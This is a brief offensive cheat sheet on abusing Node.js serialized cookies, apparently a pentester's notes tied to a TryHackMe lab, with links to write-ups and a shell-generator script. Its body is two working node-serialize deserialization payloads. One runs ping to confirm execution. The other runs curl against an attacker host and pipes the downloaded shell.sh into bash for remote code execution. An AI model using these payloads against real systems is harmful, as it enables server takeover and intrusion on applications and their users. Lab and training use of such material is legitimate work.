#  Javascript Cookie Abuse

## Cookies with executables
Ping to test 
```json
{"username":"_$$ND_FUNC$$_function (){require('child_process').exec('ping -c 3 $IP', function(error, stdout, stderr) { console.log(stdout) });}()","isGuest":true,"encoding": "utf-8"}`
```

Host shell.sh; encode base64 this cookie:
```json
{"username":"_$$ND_FUNC$$_require('child_process').exec('curl http://$IP/shell.sh | bash', function(error, stdout, stderr) { console.log(stdout) })","isGuest":true,"encoding": "utf-8"}
```

[nodejsshell.py](https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py)

## References

[falseintel](https://falseintel.github.io/thm-vulnnet-node-writeup.html)
[kartikeyj96](https://github.com/kartikeyj96/Tryhackme-Writeups/blob/main/VulnNet-Node%20Writeup)
[Node.Js-Security-Course](https://github.com/ajinabraham/Node.Js-Security-Course)
[opsecx](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/)